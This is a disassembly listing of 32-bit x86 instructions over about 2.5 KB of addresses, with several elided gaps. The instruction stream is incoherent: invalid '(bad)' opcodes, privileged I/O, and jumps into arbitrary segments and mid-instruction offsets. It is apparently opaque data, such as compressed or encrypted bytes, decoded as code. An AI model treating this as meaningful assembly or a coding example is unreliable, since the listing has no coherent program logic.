  41f08f:	dec    BYTE PTR [edx+0x4aedd2c5]
  41f095:	add    DWORD PTR [edx+esi*4-0x2d],esp
  41f099:	or     esp,0xdce68912
  41f09f:	leave  
  41f0a0:	jmp    DWORD PTR [edx+0x3]
  41f0a3:	mov    bl,0x65
  41f0a5:	jnp    0x41f0a4
  41f0a7:	cmp    DWORD PTR [ecx],ebp
  41f0a9:	xchg   ch,cl
  41f0ab:	dec    eax
  41f0ac:	es scas al,BYTE PTR es:[edi]
  41f0ae:	sub    al,0xb8
  41f0b0:	and    DWORD PTR [ecx+0x22991ba9],0x8bddcecb
  41f0ba:	sub    al,0xde
  41f0bc:	fs clc 
  41f0be:	jmp    0xf4ae5574
  41f0c3:	xchg   ebx,eax
  41f0c4:	push   esi
  41f0c5:	xchg   esi,eax
  41f0c6:	aaa    
  41f0c7:	outs   dx,DWORD PTR ds:[esi]
  41f0c8:	fwait
  41f0c9:	aam    0x6e
  41f0cb:	pop    ecx
  41f0cc:	test   DWORD PTR [ecx+0x56],esp
  41f0cf:	pop    ds
  41f0d0:	pop    ss
  41f0d1:	dec    eax
  41f0d2:	pop    ss
  41f0d3:	mov    DWORD PTR ds:0x2af82109,edx
  41f0d9:	mov    es,WORD PTR [edi]
  41f0db:	push   edi
  41f0dc:	dec    ebx
  41f0dd:	or     eax,0xd363a265
  41f0e2:	inc    esp
  41f0e3:	scas   al,BYTE PTR es:[edi]
  41f0e4:	hlt    
  41f0e5:	push   edi
  41f0e6:	add    edi,DWORD PTR [edi]
  41f0e8:	clc    
  41f0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ea:	push   ebx
  41f0eb:	aaa    
  41f0ec:	xchg   esp,eax
  41f0ed:	rcl    DWORD PTR [ebx+eiz*4],cl
  41f0f0:	jecxz  0x41f090
  41f0f2:	scas   eax,DWORD PTR es:[edi]
  41f0f3:	out    0x7d,eax
  41f0f5:	sahf   
  41f0f6:	in     eax,0x6b
  41f0f8:	iret   
  41f0f9:	mov    ebx,0xa034882e
  41f0fe:	adc    eax,0x8a020630
  41f103:	push   ds
  41f104:	cdq    
  41f105:	test   BYTE PTR [edi-0x8],dh
  41f108:	cmp    esp,ebx
  41f10a:	pushf  
  41f10b:	jne    0x41f163
  41f10d:	sub    al,0x78
  41f10f:	sub    eax,0x594a5d
  41f114:	and    al,0x7c
  41f116:	jge    0x41f175
  41f118:	xor    DWORD PTR [edx+0x7fd1ba36],eax
  41f11e:	add    dl,BYTE PTR [eax-0x22]
  41f121:	push   esp
  41f122:	scas   al,BYTE PTR es:[edi]
  41f123:	std    
  41f124:	gs mov ah,0xb6
  41f127:	sbb    edx,DWORD PTR [edx-0x2806fcf3]
  41f12d:	ins    DWORD PTR es:[edi],dx
  41f12e:	add    bl,BYTE PTR [ebx-0xde4e9cd]
  41f134:	and    edi,DWORD PTR [esi+0x30]
  41f137:	cmp    DWORD PTR [edi-0x2],eax
  41f13a:	jae    0x41f139
  41f13c:	mov    ah,al
  41f13e:	in     eax,0x4e
  41f140:	jno    0x41f11c
  41f142:	adc    DWORD PTR [ebp-0x2170daae],esi
  41f148:	mov    bl,0xd6
  41f14a:	icebp  
  41f14b:	pop    esi
  41f14c:	inc    ebx
  41f14d:	pop    ebp
  41f14e:	or     DWORD PTR [esi],eax
  41f150:	add    BYTE PTR [edi],dl
  41f152:	mov    edi,0xebe397a5
  41f157:	popa   
  41f158:	jns    0x41f176
  41f15a:	repnz lods al,BYTE PTR ds:[si]
  41f15d:	mov    ebp,0x9a20d056
  41f162:	enter  0x423b,0xb8
  41f166:	in     eax,dx
  41f167:	iret   
  41f168:	(bad)  
  41f169:	popa   
  41f16a:	cmp    bl,BYTE PTR [edi+0x39]
	...
  41f1d5:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4df0:0x3a01f6d3
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	inc    DWORD PTR [eax]
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	add    bh,bl
  41f1f0:	pop    edi
  41f1f1:	push   0x5ef81beb
  41f1f6:	xchg   edi,eax
  41f1f7:	jae    0x41f180
  41f1f9:	inc    ebx
  41f1fa:	jge    0x41f1e4
  41f1fc:	or     ecx,esi
  41f1fe:	gs inc esi
  41f200:	mov    ebx,0x68dd4e37
  41f205:	pop    edx
  41f206:	xor    DWORD PTR [edi-0x53762bae],esp
  41f20c:	mov    esp,0x83d32eb9
  41f211:	and    eax,0x4bf4b391
  41f216:	push   eax
  41f217:	(bad)  
  41f218:	inc    esp
  41f219:	lods   al,BYTE PTR ds:[esi]
  41f21a:	or     DWORD PTR [edi-0x2958b5e8],0xd8e5f01c
  41f224:	or     eax,0x26cd2cc7
  41f229:	pop    ebx
  41f22a:	ds cwde 
  41f22c:	push   edi
  41f22d:	pop    ds
  41f22e:	fcomp  QWORD PTR [ecx+edx*1-0x21]
  41f233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f234:	in     al,dx
  41f235:	jle    0x41f1ec
  41f237:	dec    edi
  41f238:	xchg   esi,eax
  41f239:	dec    esp
  41f23a:	adc    ch,al
  41f23c:	imul   esp,DWORD PTR ds:0x92be6553,0x336bc42
  41f246:	push   cs
  41f247:	sbb    DWORD PTR [edi+eiz*4],eax
  41f24a:	or     eax,0x920d0372
  41f24f:	lahf   
  41f250:	mov    ebx,0xc055f57
  41f255:	push   ebx
  41f256:	fdiv   st,st(5)
  41f258:	pop    ebp
  41f259:	jno    0x41f207
  41f25b:	xor    BYTE PTR [ecx-0x584b0f50],ch
  41f261:	mov    ch,0x26
  41f263:	push   ebp
  41f264:	in     eax,dx
  41f265:	push   ds
  41f266:	or     eax,0x7a5e1bf8
  41f26b:	push   ebx
  41f26c:	lods   al,BYTE PTR ds:[esi]
  41f26d:	mov    BYTE PTR [esi-0x24],ch
  41f270:	cld    
  41f271:	and    eax,DWORD PTR [eax+0x335edfc]
  41f277:	retf   
  41f278:	or     BYTE PTR [ebx+esi*4-0x2e],ch
  41f27c:	cmc    
  41f27d:	dec    eax
  41f27e:	out    0x9f,al
  41f280:	mov    ds:0x556f4519,al
  41f285:	xor    DWORD PTR [ebp+0x7b],eax
  41f288:	push   es
  41f289:	sbb    al,0x9b
  41f28b:	jae    0x41f2eb
  41f28d:	mov    ah,0xf6
  41f28f:	aam    0xcc
  41f291:	sub    DWORD PTR [ebx-0x22],edx
  41f294:	je     0x41f282
  41f296:	ja     0x41f23b
  41f298:	xor    ebp,DWORD PTR ds:0x71b5c687
  41f29e:	jg     0x41f289
  41f2a0:	xor    BYTE PTR [eax+0x38eb4856],0xac
  41f2a7:	cli    
  41f2a8:	or     ah,bl
  41f2aa:	test   DWORD PTR [esi+0x2b550141],edx
  41f2b0:	xchg   edi,eax
  41f2b1:	(bad)  es:[ebx+0x4]
  41f2b5:	push   0xee69032d
  41f2ba:	or     BYTE PTR [esi+0x12],0x85
  41f2be:	in     al,dx
  41f2bf:	adc    ecx,DWORD PTR [ecx-0x4]
  41f2c2:	adc    esp,ecx
  41f2c4:	je     0x41f345
  41f2c6:	sub    DWORD PTR [ecx],eax
  41f2c8:	fwait
  41f2c9:	rcl    DWORD PTR [ebp+0x5c],1
  41f2cc:	pop    ecx
  41f2cd:	adc    eax,0xa864981e
  41f2d2:	and    ebp,edx
  41f2d4:	out    dx,al
  41f2d5:	outs   dx,BYTE PTR ds:[esi]
  41f2d6:	push   ss
  41f2d7:	icebp  
  41f2d8:	jnp    0x41f28a
  41f2da:	jmp    0xbc9e:0xbd993ab8
  41f2e1:	push   ebx
  41f2e3:	jp     0x41f29e
  41f2e5:	cdq    
  41f2e6:	push   ebp
  41f2e7:	sub    eax,0x51acf08c
  41f2ec:	sub    DWORD PTR [eax],eax
	...
  41f356:	push   ecx
  41f357:	sbb    edi,edi
  41f359:	jmp    si
  41f35c:	fnstcw WORD PTR [edi]
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f38f
  41f363:	bsf    edi,DWORD PTR [ecx]
  41f366:	out    dx,eax
  41f367:	dec    esi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	inc    DWORD PTR [eax]
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	sub    BYTE PTR [eax-0x7e],ah
  41f371:	add    eax,ebp
  41f373:	out    0x13,al
  41f375:	cmc    
  41f376:	sbb    DWORD PTR [edi+ebp*1-0x3be6867c],0x18
  41f37e:	cs jne 0x41f34b
  41f381:	adc    al,0xe9
  41f383:	pop    es
  41f384:	xchg   ecx,eax
  41f385:	enterw 0x854f,0xe
  41f38a:	cmp    esi,DWORD PTR [esi+0x3d864854]
  41f390:	rol    BYTE PTR [ebx-0x3b6d852e],cl
  41f396:	adc    BYTE PTR [eax],ch
  41f398:	inc    ebp
  41f399:	stos   DWORD PTR es:[edi],eax
  41f39a:	add    DWORD PTR [esi+0x2],edx
  41f39d:	imul   edi,DWORD PTR [eax+0x1f],0x8f024606
  41f3a4:	outs   dx,DWORD PTR ds:[esi]
  41f3a5:	ins    DWORD PTR es:[edi],dx
  41f3a6:	push   esi
  41f3a7:	nop
  41f3a8:	ja     0x41f33c
  41f3aa:	mov    ebp,0x1ea2aee3
  41f3af:	jnp    0x41f3c9
  41f3b1:	(bad)  
  41f3b2:	sub    DWORD PTR [esi-0x69],ecx
  41f3b5:	aam    0x5b
  41f3b7:	scas   eax,DWORD PTR es:[edi]
  41f3b8:	dec    eax
  41f3b9:	jnp    0x41f39a
  41f3bb:	outs   dx,BYTE PTR ds:[esi]
  41f3bc:	jmp    0xbb40:0xe5dbd1f7
  41f3c3:	inc    edi
  41f3c4:	mov    BYTE PTR [ecx],dh
  41f3c6:	mov    edi,edx
  41f3c8:	inc    eax
  41f3c9:	iret   
  41f3ca:	adc    al,0x3
  41f3cc:	mov    al,0xe9
  41f3ce:	push   es
  41f3cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3d0:	stos   DWORD PTR es:[edi],eax
  41f3d1:	icebp  
  41f3d2:	push   eax
  41f3d3:	jo     0x727aa464
  41f3d9:	mov    ebx,0x9c94d18d
  41f3de:	push   0xffffff8d
  41f3e0:	aad    0xb
  41f3e2:	jl     0x41f463
  41f3e4:	out    0x43,al
  41f3e6:	jle    0x41f453
  41f3e8:	hlt    
  41f3e9:	test   ch,bl
  41f3eb:	inc    esp
  41f3ec:	xor    bh,BYTE PTR [ebx-0x7cd5c7ea]
  41f3f2:	dec    esi
  41f3f3:	mov    DWORD PTR [ebp+0x1f],0x807f6e7f
  41f3fa:	daa    
  41f3fb:	mov    eax,DWORD PTR [edx+ebx*2+0x208ccbb6]
  41f402:	or     al,0xa
  41f404:	xchg   BYTE PTR [edx],ch
  41f406:	int    0x89
  41f408:	pop    ss
  41f409:	dec    esp
  41f40a:	inc    ebx
  41f40b:	enter  0x7efd,0x1f
  41f40f:	pop    es
  41f410:	ins    DWORD PTR es:[edi],dx
  41f411:	xchg   DWORD PTR [ecx],ebp
  41f413:	xchg   ecx,eax
  41f414:	dec    ebp
  41f415:	mov    ebx,0x96262f02
  41f41a:	pop    es
  41f41b:	jne    0x41f462
  41f41d:	adc    al,0xb4
  41f41f:	fst    st(1)
  41f421:	xor    eax,0x739e77ed
  41f426:	sub    eax,0xf9e91a80
  41f42b:	adc    eax,0xd85955f4
  41f430:	fisub  DWORD PTR ds:[esi]
  41f433:	inc    ebx
  41f434:	aad    0x64
  41f436:	iret   
  41f437:	psubq  mm1,QWORD PTR [edx-0x76a63495]
  41f43e:	pop    esi
  41f43f:	mov    ch,0x4b
  41f441:	jg     0x41f431
  41f443:	xor    al,0xbb
  41f445:	sub    cl,bh
  41f447:	sub    cl,BYTE PTR [ebx]
  41f449:	and    DWORD PTR [edx+0x5abf0aeb],esi
  41f44f:	dec    esi
  41f450:	ds jbe 0x41f437
  41f453:	and    cl,BYTE PTR [edx+ebx*8+0x1376e432]
  41f45a:	in     al,0xa8
  41f45c:	jp     0x41f466
  41f45e:	int3   
  41f45f:	aad    0x40
  41f461:	pusha  
  41f462:	jb     0x41f4d5
  41f464:	xor    bh,dh
  41f466:	in     eax,dx
  41f467:	ficom  DWORD PTR [esi-0x2c]
  41f46a:	ret    0x8e9
	...
  41f4d5:	add    BYTE PTR [edi+eiz*8],bh
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x91
  41f4e3:	loope  0x41f4ca
  41f4e5:	data16 out dx,al
  41f4e7:	dec    edi
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	inc    DWORD PTR [eax]
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	push   ds
  41f4ef:	lea    esi,[ebx]
  41f4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4f2:	fdivr  DWORD PTR [edx]
  41f4f4:	outs   dx,DWORD PTR ds:[esi]
  41f4f5:	xchg   esi,eax
  41f4f6:	stos   BYTE PTR es:[edi],al
  41f4f7:	aaa    
  41f4f8:	push   ds
  41f4f9:	pop    edx
  41f4fa:	in     al,0xcd
  41f4fc:	xchg   edi,eax
  41f4fd:	aad    0x7a
  41f4ff:	mov    ah,0x4b
  41f501:	sub    al,0xd3
  41f503:	jo     0x41f537
  41f505:	sub    esi,ebx
  41f507:	sub    BYTE PTR [esi-0x4],cl
  41f50a:	clc    
  41f50b:	test   eax,0xce4eb854
  41f510:	lock in al,dx
  41f512:	gs popa 
  41f514:	cld    
  41f515:	sub    al,0x16
  41f517:	jmp    0xc823efb
  41f51c:	retf   0xbb82
  41f51f:	into   
  41f520:	adc    cl,ch
  41f522:	ret    
  41f523:	mov    eax,ds:0x576cee1c
  41f528:	sbb    DWORD PTR [esi+0x3e37edf8],ebp
  41f52e:	out    0x21,al
  41f530:	jbe    0x41f4c7
  41f532:	ins    BYTE PTR es:[edi],dx
  41f533:	cli    
  41f534:	adc    ebx,DWORD PTR [esi+0x3116888b]
  41f53a:	out    dx,al
  41f53b:	cmp    eax,0x816fcf4d
  41f540:	mov    al,0x2d
  41f542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f543:	jo     0x41f5ad
  41f545:	xchg   ebp,eax
  41f546:	mov    ds:0x252b5874,al
  41f54b:	pop    edi
  41f54c:	push   es
  41f54d:	imul   BYTE PTR [ecx+0x70]
  41f550:	cmp    DWORD PTR ds:0xcdd3e945,ecx
  41f556:	(bad)  
  41f557:	jecxz  0x41f544
  41f559:	ret    0xb759
  41f55c:	mov    esi,0xa1fed8df
  41f561:	sti    
  41f562:	adc    al,BYTE PTR [edi+ebp*2]
  41f565:	mov    edx,0xa8d4ca2a
  41f56a:	fistp  DWORD PTR [ebp+0x2aa138c5]
  41f570:	sahf   
  41f571:	sub    edi,DWORD PTR [eax]
  41f573:	lahf   
  41f574:	aas    
  41f575:	cmp    edx,edx
  41f577:	sbb    esp,edi
  41f579:	lahf   
  41f57a:	mov    eax,ds:0xfa1bdb2a
  41f57f:	jle    0x41f58f
  41f581:	mov    bl,0xe3
  41f583:	enter  0x4b89,0x84
  41f587:	stos   DWORD PTR es:[edi],eax
  41f588:	scas   al,BYTE PTR es:[edi]
  41f589:	lods   al,BYTE PTR ds:[esi]
  41f58a:	sbb    DWORD PTR [eax+0x141710fb],edx
  41f590:	inc    ebp
  41f591:	pop    ebp
  41f592:	mov    esi,0x8c8dce07
  41f597:	fistp  DWORD PTR [edi-0x264e5fb]
  41f59d:	mov    al,ds:0xe6344505
  41f5a2:	fcomp  DWORD PTR [ebp+0x5f]
  41f5a5:	iret   
  41f5a6:	push   es
  41f5a7:	cdq    
  41f5a8:	and    ecx,DWORD PTR [edx+eax*2]
  41f5ab:	sub    eax,0x735f03cf
  41f5b0:	push   edi
  41f5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b2:	add    BYTE PTR [edx+0x44],bh
  41f5b5:	inc    ebx
  41f5b6:	loop   0x41f5cf
  41f5b8:	pop    eax
  41f5b9:	jmp    0x41f637
  41f5bb:	pop    ebp
  41f5bc:	mov    cl,BYTE PTR [ebx+ebp*8]
  41f5bf:	hlt    
  41f5c0:	push   es
  41f5c1:	dec    edx
  41f5c2:	js     0x41f58b
  41f5c4:	dec    eax
  41f5c5:	rcr    BYTE PTR [esi],0xbf
  41f5c8:	push   eax
  41f5c9:	in     al,0x18
  41f5cb:	in     al,dx
  41f5cc:	mov    es,WORD PTR [ecx+0x36]
  41f5cf:	pop    ebx
  41f5d0:	xchg   edi,eax
  41f5d1:	add    al,0xa6
  41f5d3:	xchg   ebx,eax
  41f5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5d5:	mov    ecx,0xfdf1b6e4
  41f5da:	cmc    
  41f5db:	or     ecx,DWORD PTR [ebp-0x32cb56b7]
  41f5e1:	dec    eax
  41f5e2:	sbb    esp,edx
  41f5e4:	jne    0x41f65f
  41f5e6:	inc    ebx
  41f5e7:	sbb    cl,BYTE PTR [ebp+0x74]
  41f5ea:	sub    DWORD PTR [ecx+0x3a],ebp
	...
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x751a:0x13f2d422
  41f666:	in     eax,dx
  41f667:	push   eax
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	inc    DWORD PTR [eax]
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	mov    dh,0xe8
  41f670:	mov    ebx,0x318cb78f
  41f675:	mov    edi,0x43584fcf
  41f67a:	sbb    eax,0xefb54563
  41f67f:	jmp    0x41f6e1
  41f681:	lea    esp,[ecx+0x70]
  41f684:	icebp  
  41f685:	not    dl
  41f687:	xchg   ebp,eax
  41f688:	and    al,0x5
  41f68a:	loopne 0x41f60f
  41f68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f68d:	enter  0x5291,0x7e
  41f691:	mov    eax,0x200d4450
  41f696:	jns    0x41f639
  41f698:	or     dl,ah
  41f69a:	or     dl,BYTE PTR [eax+eiz*4]
  41f69d:	adc    eax,DWORD PTR [eax+0x9873332]
  41f6a3:	repnz in al,0xb2
  41f6a6:	pop    es
  41f6a7:	lahf   
  41f6a8:	xchg   ebp,eax
  41f6a9:	out    0x4c,eax
  41f6ab:	jmp    0xf1328d8d
  41f6b0:	push   es
  41f6b1:	pop    ss
  41f6b2:	shl    DWORD PTR es:[eax-0x4d1d75ea],0xf0
  41f6ba:	add    ch,BYTE PTR [ecx-0x27]
  41f6bd:	repz mov bp,0xf36f
  41f6c2:	(bad)  
  41f6c3:	shr    BYTE PTR [ecx-0x7c],0xb6
  41f6c7:	jnp    0x41f6ab
  41f6c9:	sub    esp,DWORD PTR [edx]
  41f6cb:	inc    edx
  41f6cc:	loopne 0x41f689
  41f6ce:	lahf   
  41f6cf:	adc    DWORD PTR [ebp+0x53de22bb],edi
  41f6d5:	pop    ds
  41f6d6:	adc    al,BYTE PTR [edx+0x66]
  41f6d9:	mov    eax,0xd32889cc
  41f6de:	imul   edx,ecx,0x50
  41f6e1:	imul   edi,DWORD PTR [ebp+0x6a],0x201d1c71
  41f6e8:	push   eax
  41f6e9:	mov    ds:0xbfe8521a,al
  41f6ee:	adc    al,0x72
  41f6f0:	mov    ebp,DWORD PTR [esi]
  41f6f2:	sti    
  41f6f3:	outs   dx,DWORD PTR ds:[esi]
  41f6f4:	arpl   WORD PTR [ebx],dx
  41f6f6:	ror    eax,1
  41f6f8:	push   edi
  41f6f9:	std    
  41f6fa:	xchg   ebp,eax
  41f6fb:	xor    bh,BYTE PTR [edi]
  41f6fd:	test   al,0x8e
  41f6ff:	call   0x704a2beb
  41f704:	jae    0x41f6f6
  41f706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f707:	js     0x41f70c
  41f709:	mov    ebx,0xc7cec9f4
  41f70e:	xchg   ecx,eax
  41f70f:	das    
  41f710:	xor    dl,dh
  41f712:	pop    ds
  41f713:	xor    BYTE PTR [eax+0x3d],0xc0
  41f717:	test   BYTE PTR [ebx+0x46],ah
  41f71a:	pop    ds
  41f71b:	dec    edi
  41f71c:	jno    0x41f767
  41f71e:	dec    edi
  41f71f:	cdq    
  41f720:	pop    ds
  41f721:	in     al,dx
  41f722:	dec    esp
  41f723:	fs jae 0x41f6bb
  41f726:	daa    
  41f727:	sub    al,0x2f
  41f729:	xchg   ecx,eax
  41f72a:	inc    ebx
  41f72b:	shr    BYTE PTR [edx-0x61],1
  41f72e:	adc    eax,0x672a37aa
  41f733:	fdivr  QWORD PTR [eax-0x42]
  41f736:	jb     0x41f764
  41f738:	sbb    ebp,DWORD PTR [esi]
  41f73a:	fs sahf 
  41f73c:	push   cs
  41f73d:	out    0x7d,eax
  41f73f:	xor    BYTE PTR [edi-0x111ff88a],0xd2
  41f746:	data16 outs dx,BYTE PTR ds:[esi]
  41f748:	sbb    eax,0xd11bea1c
  41f74d:	jno    0x41f74f
  41f74f:	and    ebp,DWORD PTR [ebp-0x52b1f10a]
  41f755:	(bad)  
  41f757:	pop    ecx
  41f758:	jo     0x41f73b
  41f75a:	cmp    esp,DWORD PTR [ecx+0xe]
  41f75d:	cmp    al,0x3d
  41f75f:	aam    0x6d
  41f761:	cwde   
  41f762:	out    0x30,al
  41f764:	adc    DWORD PTR [ecx+0x5a8e1c4f],0x4a
  41f76b:	pop    edi
  41f76c:	cmp    DWORD PTR [eax],eax
	...
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xc649:0x2b6c62d2
  41f7e5:	pop    edx
  41f7e6:	in     al,dx
  41f7e7:	push   ecx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	inc    DWORD PTR [eax]
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	xchg   esi,eax
  41f7ef:	(bad)  
  41f7f0:	lahf   
  41f7f1:	out    dx,eax
  41f7f2:	push   cs
  41f7f3:	sbb    BYTE PTR [edi+0x166b04e4],bl
  41f7f9:	rcl    esp,cl
  41f7fb:	imul   ebx,edi,0x71
  41f7fe:	imul   edi,DWORD PTR ds:0xfb1aa1fe,0xffab141c
  41f808:	popa   
  41f809:	in     eax,0x9d
  41f80b:	arpl   dx,bx
  41f80d:	inc    esp
  41f80e:	jne    0x41f7ee
  41f810:	fadd   QWORD PTR [esi]
  41f812:	push   ss
  41f813:	call   DWORD PTR [esp+edx*1+0x4bffc2ea]
  41f81a:	cwde   
  41f81b:	mov    ds:0xa2541cf6,eax
  41f820:	xlat   BYTE PTR ds:[ebx]
  41f821:	mov    edx,0xd908cf90
  41f826:	rol    bh,0xc7
  41f829:	cmp    DWORD PTR [ebp+0x4f],ecx
  41f82c:	pop    ebx
  41f82d:	push   eax
  41f82e:	jmp    0x41f849
  41f830:	sar    BYTE PTR ss:[ecx+0x30],0xaf
  41f835:	add    BYTE PTR [esi],ch
  41f837:	sbb    dh,BYTE PTR [ecx+0xa74505e]
  41f83d:	in     al,dx
  41f83e:	jle    0x41f7e9
  41f840:	fnstsw WORD PTR [ebx]
  41f842:	cmc    
  41f843:	test   al,0x26
  41f845:	cmp    edi,DWORD PTR [edx]
  41f847:	xor    eax,0x7a477cab
  41f84c:	clc    
  41f84d:	lock rcl BYTE PTR [ebx+0xa279e7f],cl
  41f854:	not    edx
  41f856:	gs jge 0x41f86f
  41f859:	adc    eax,0x8ac7bea9
  41f85e:	jecxz  0x41f836
  41f860:	jmp    0x41f869
  41f862:	retf   
  41f863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f864:	mov    ch,0xab
  41f866:	inc    esp
  41f867:	xchg   esi,eax
  41f868:	push   esp
  41f869:	mov    al,ds:0x39876f14
  41f86e:	div    BYTE PTR [edx]
  41f870:	(bad)  
  41f872:	stos   DWORD PTR es:[edi],eax
  41f873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f874:	inc    ebx
  41f875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f876:	gs jb  0x41f87c
  41f879:	adc    edi,DWORD PTR [ebp+0x48]
  41f87c:	das    
  41f87d:	jge    0x41f83b
  41f87f:	jl     0x41f84c
  41f881:	cdq    
  41f882:	les    edi,FWORD PTR [edx+ebp*2-0x80]
  41f886:	aas    
  41f887:	repnz mov esp,0x59a75ef
  41f88d:	xchg   ebp,eax
  41f88e:	clc    
  41f88f:	push   eax
  41f890:	mov    esi,0x3df933f2
  41f895:	sub    al,0xfd
  41f897:	hlt    
  41f898:	mov    ds:0x2d7ce2d2,al
  41f89d:	sti    
  41f89e:	(bad)  
  41f89f:	mov    al,ds:0x9139aeb6
  41f8a4:	in     al,0x2b
  41f8a6:	pop    esi
  41f8a7:	test   ch,dh
  41f8a9:	pop    ebp
  41f8aa:	jmp    0x41f88b
  41f8ac:	lock jb 0x41f91f
  41f8af:	push   ecx
  41f8b0:	jge    0x41f926
  41f8b2:	jb     0x41f843
  41f8b4:	bnd jb 0x41f8b0
  41f8b7:	cdq    
  41f8b8:	and    eax,0xa7065599
  41f8bd:	iret   
  41f8be:	or     BYTE PTR [ecx],cl
  41f8c0:	ss pop edi
  41f8c2:	add    al,0xc8
  41f8c4:	mov    ebp,0xd5f9fc68
  41f8c9:	push   eax
  41f8ca:	inc    ecx
  41f8cb:	mov    al,ds:0x46a049b5
  41f8d0:	dec    ebp
  41f8d1:	iret   
  41f8d2:	and    eax,0x8bffdfec
  41f8d7:	adc    ebx,DWORD PTR [ebx-0x613ee4a8]
  41f8dd:	xlat   BYTE PTR ds:[ebx]
  41f8de:	(bad)  
  41f8df:	jle    0x41f93a
  41f8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8e2:	add    eax,0xa9deb2d3
  41f8e7:	fdivp  st(4),st
  41f8e9:	sbb    dh,BYTE PTR [edi-0xc]
  41f8ec:	pusha  
	...
  41f955:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	dec    ebx
  41f963:	ins    DWORD PTR es:[edi],dx
  41f964:	pop    edi
  41f965:	mov    al,ds:0x152eb
  41f96a:	inc    DWORD PTR [eax]
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	test   DWORD PTR [ebx+0x4657808d],edx
  41f974:	xchg   ecx,eax
  41f975:	outs   dx,DWORD PTR ds:[esi]
  41f976:	xchg   edx,eax
  41f977:	out    dx,eax
  41f978:	inc    esi
  41f979:	xchg   esi,eax
  41f97a:	test   BYTE PTR [eax+0x7e],dh
  41f97d:	sub    dl,BYTE PTR [edx+0x12]
  41f980:	mov    eax,ds:0xb9c16404
  41f985:	xchg   ecx,eax
  41f986:	nop
  41f987:	adc    BYTE PTR [esp+edi*8-0x55f768a5],al
  41f98e:	mov    ch,0x3d
  41f990:	sub    DWORD PTR [edx+edx*2],ebp
  41f993:	cwde   
  41f994:	mov    al,0x4e
  41f996:	cmp    al,BYTE PTR [eax]
  41f998:	stc    
  41f999:	mov    ah,0x47
  41f99b:	clc    
  41f99c:	inc    ecx
  41f99d:	adc    ebp,DWORD PTR [ebp+eax*2+0x6e]
  41f9a1:	mov    WORD PTR [ebx],cs
  41f9a3:	outs   dx,DWORD PTR ds:[esi]
  41f9a4:	mov    al,ds:0xa1bd4dee
  41f9a9:	call   0xf11fda0e
  41f9ae:	mov    dh,0x92
  41f9b0:	xor    eax,DWORD PTR [eax-0x17ef56d]
  41f9b6:	sub    al,0x49
  41f9b8:	pop    ecx
  41f9b9:	push   edi
  41f9ba:	push   eax
  41f9bb:	out    dx,al
  41f9bc:	mov    bh,0x95
  41f9be:	push   ebx
  41f9bf:	jge    0x41f9fa
  41f9c1:	div    ah
  41f9c3:	jnp    0x41f986
  41f9c5:	inc    esi
  41f9c6:	push   ss
  41f9c7:	aam    0x32
  41f9c9:	pop    edi
  41f9ca:	cdq    
  41f9cb:	add    DWORD PTR [ecx-0x2a6cd167],ecx
  41f9d1:	push   cs
  41f9d2:	test   BYTE PTR [esi],dl
  41f9d4:	imul   esp,DWORD PTR [edx+0x2e],0xffffff9a
  41f9d8:	pop    esi
  41f9d9:	inc    esi
  41f9da:	stc    
  41f9db:	and    BYTE PTR [ecx+eax*1+0x59293da2],al
  41f9e2:	fdiv   st,st(7)
  41f9e4:	xor    ecx,esi
  41f9e6:	loopne 0x41f9d3
  41f9e8:	aaa    
  41f9e9:	lods   eax,DWORD PTR ds:[esi]
  41f9ea:	call   0xff8907cb
  41f9ef:	pop    eax
  41f9f0:	pop    DWORD PTR [edx+0x4bda14cf]
  41f9f6:	ret    
  41f9f7:	mov    eax,ds:0xbf84c99e
  41f9fc:	fsub   st(3),st
  41f9fe:	imul   edx,DWORD PTR [ecx+edi*2+0x1b896718],0x7
  41fa06:	jg     0x41fa86
  41fa08:	bound  esp,QWORD PTR [esi+0x5]
  41fa0b:	xchg   ecx,eax
  41fa0c:	in     al,0x34
  41fa0e:	popa   
  41fa0f:	adc    esp,esi
  41fa11:	test   DWORD PTR [ebp+0x6f],esp
  41fa14:	rcr    BYTE PTR [edx],cl
  41fa16:	inc    edi
  41fa17:	pop    es
  41fa18:	repz cmp eax,0xd7005a28
  41fa1e:	call   0x743c:0xba1eaa90
  41fa25:	stc    
  41fa26:	shl    ah,cl
  41fa28:	adc    bl,al
